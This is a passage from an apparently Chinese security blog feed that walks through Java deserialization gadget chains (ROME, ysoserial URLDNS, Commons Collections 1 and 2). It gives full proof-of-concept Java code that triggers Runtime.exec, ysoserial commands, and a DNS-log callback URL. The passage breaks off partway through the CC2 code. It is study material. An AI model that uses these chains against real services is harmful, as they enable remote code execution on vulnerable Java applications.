class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(h1,h1);<br>        hashMap.put(h2,h2);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> toStringBean.getClass().getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(toStringBean,templatesimpl);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要两次put，因为第一次进入<code>putVal</code>的时候tab里面没有元素，导致不能进入else分支（equals所在的分支），需要执行<code>afterNodeInsertion</code>之后将键值对加入tab，所以需要第二次进入<code>putVal</code>。</p><img src="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg" class=""><h4 id="payload缩短"><a class="markdownIt-Anchor" href="#payload缩短"></a> payload缩短</h4><p>使用Javassist生成的恶意类可以缩短payload，<a href="2024/08/29/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3">写法参考</a></p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><p><a href="https://xz.aliyun.com/t/12768">https://xz.aliyun.com/t/12768</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ysoserial</title>
    <link href="/2024/09/07/ysoserial/"/>
    <url>/2024/09/07/ysoserial/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p>ysoserial是一款用于生成利用不安全Java对象反序列化的有效负载的概念验证工具。</p><p>下载：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar [payload] <span class="hljs-string">&#x27;[command]&#x27;</span> | <span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="urldns"><a class="markdownIt-Anchor" href="#urldns"></a> URLDNS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar URLDNS <span class="hljs-string">&quot;http://0a827c36.log.dnslog.biz&quot;</span> | <span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p>链子（主要是hashcode）</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>URL.<span class="hljs-function"><span class="hljs-title">hashCode</span>-&gt;</span>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>.hashcode-&gt;</span>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>.getHostAddress-&gt;</span>URL.<span class="hljs-function"><span class="hljs-title">getHostAddress</span>-&gt;</span>InetAddress.getByName<br></code></pre></td></tr></table></figure><p>getHostAddress从域名到ip肯定会做域名解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL,Integer&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;(); <span class="hljs-comment">//定义一个HashMap对象</span><br>        URL url=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://97092003.log.dnslog.biz&quot;</span>); <span class="hljs-comment">//定义一个URL对象</span><br>        Class c=url.getClass();<br>        Field hashcodefield=c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">// 更改hashcode的值为非-1，防止在put时就发送dns请求</span><br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        hashcodefield.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//将hashcode的值改回-1，这样才能使反序列化后能够触发getHostAddress</span><br>        serialize(hashMap);<br><span class="hljs-comment">//        deserialize();</span><br>        String ser=<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAFzYxYzA3M2U1LmxvZy5kbnNsb2cuYml6dAAAcQB+AAV0AARodHRwcHh0AB5odHRwOi8vNjFjMDczZTUubG9nLmRuc2xvZy5iaXp4&quot;</span>;<br>        deserialize(ser);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ObjectOutputStream oos= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><span class="hljs-comment">//    public static Object deserialize() throws Exception &#123;</span><br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="hljs-comment">//        return ois.readObject();</span><br><span class="hljs-comment">//    &#125;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        System.out.println(obj);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2024/09/07/ysoserial/2.jpg" class=""><h3 id="commons-collection-1"><a class="markdownIt-Anchor" href="#commons-collection-1"></a> Commons Collection 1</h3><p>影响版本：jdk&lt;8u71，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections1 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="transformedmap链"><a class="markdownIt-Anchor" href="#transformedmap链"></a> TransformedMap链</h4><p>链子（这条链不是和ysoserial完全一样的）主要是transform方法，ChainedTransformer可以任意反射调用。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>.setValue-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>.checkSetValue-&gt;</span>ChainedTransformer.transform<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt; ();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class c= Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Object object= constructor.newInstance(Retention.class,transformedMap);<br>        serializeBase(object);<br>        deserialize(serializeBase(object));<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serializeBase</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        System.out.println(obj);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="lazymap链"><a class="markdownIt-Anchor" href="#lazymap链"></a> LazyMap链</h4><p>ysoserial中的CC1</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>(Proxy).entrySet-&gt;</span>A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.invoke-&gt;</span>L<span class="hljs-function"><span class="hljs-title">azyMap</span>.get-&gt;</span>ChainedTransformer.transform<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; Lazymap = LazyMap.decorate(map,chainedTransformer);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Target.class,Lazymap);<br><span class="hljs-comment">//动态代理</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class,mapProxy);<br>        String s= serialize(o);<br>        deserialize(s);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h5><p>需要自己重写LazyMap.java不然调试都进不去然后就命令执行完了根本调不懂</p><img src="/2024/09/07/ysoserial/1.jpg" class=""><h3 id="commons-collection-2"><a class="markdownIt-Anchor" href="#commons-collection-2"></a> Commons Collection 2</h3><p>影响版本：jdk无限制，CommonsCollections 4.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections2 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.heapify-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.siftDown-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.siftDownUsingComparator-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformingComparator</span>.compare-&gt;</span>I<span class="hljs-function"><span class="hljs-title">nvokerTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 